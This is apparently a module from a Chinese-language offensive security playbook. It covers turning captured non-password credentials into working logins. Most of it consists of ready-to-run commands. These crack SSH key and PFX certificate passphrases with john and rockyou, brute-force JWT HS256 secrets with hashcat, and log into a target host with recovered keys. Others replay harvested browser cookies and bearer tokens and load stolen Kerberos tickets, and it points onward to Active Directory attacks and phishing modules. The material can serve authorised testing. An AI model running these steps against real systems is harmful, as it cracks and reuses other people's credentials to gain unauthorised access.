# Token / 证书 / SSH / Cookie / Passkey

> **TECH：** 非口令型身份材料的识别、转换、校验  
> **成功：** 材料能通过一次真实认证  
> **不是成功：** 只解码 JWT payload、只看到 .pfx 文件

---

## 1. SSH 私钥

```bash
ls -l id_rsa id_ed25519 *.pem
head -1 id_rsa
ssh-keygen -y -f id_rsa     # 能出公钥 = 文件完整；要口令会提示
ssh2john id_rsa > ssh.hash
john --wordlist=rockyou.txt ssh.hash
```

有口令先破解，再：

```bash
chmod 600 id_rsa
ssh -i id_rsa -o BatchMode=yes user@TARGET id
```

成功 = 登录。接着候选 `/privesc-linux` 或 `/post`，本文件停。

---

## 2. PFX / 证书

```bash
pfx2john cert.pfx > pfx.hash
john --wordlist=rockyou.txt pfx.hash
openssl pkcs12 -in cert.pfx -info -nokeys
```

解开后标：是否 Client Auth、是否用户/机器证书。用它去要 TGT / 打 ADCS 消费者 = `/ad-attack`。本模块只负责解开并记录。

---

## 3. JWT / refresh / API token

```bash
# JWT：三段，eyJ 开头
echo "$JWT" | cut -d. -f1,2 | while read x; do echo $x | base64 -d 2>/dev/null; echo; done

hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
```

HS256 弱密钥才值得砸。RS256 不要当密码 hash。

```bash
# 校验
curl -sH "Authorization: Bearer $TOKEN" https://TARGET/api/me
```

Refresh token 能换 access 也算成功。云 token 校验见 `secret-discovery.md`，枚举归 `/cloud-recon`。

---

## 4. Cookie / 会话

浏览器收割来的 cookie：

```text
能重放到目标站并出现已登录响应 → 成功
Cloud portal cookie → 候选 /cloud-recon
IdP 会话           → 不要在这里做 AiTM（/phishing）
HttpOnly 只是存储位置问题，ABE/DPAPI 解开后仍可用
```

把 cookie 写成 `Cookie:` 头做一次 GET 即可校验，不要开全自动 crawler。

---

## 5. Passkey / FIDO2 / WHfB

```text
发现：WebAuthn / FIDO2 / Windows Hello for Business / passkey
动作：标记 origin-bound、不可导出
不要：编 TPM 私钥提取、不要当密码 dump、不要 hashcat
```

本模块到此为止。绕过无密码认证属于 `/phishing`（设备码/AiTM）或 `/ad-attack`（证书映射），不是凭据导出。

---

## 6. Kerberos ccache / kirbi

```bash
export KRB5CCNAME=./user.ccache
klist
```

有效 TGT/TGS 记 notes。注入打服务 = `/ad-attack`。本模块可确认 `klist` 未过期就算校验成功。

---

## 分类进 notes

```text
kind: ssh | pfx | jwt | refresh | cookie | ccache | passkey
exportable: yes | no
validated: protocol + identity
next_candidate: /ad-recon | /cloud-recon | /k8s | /cicd | /privesc-linux | none
```
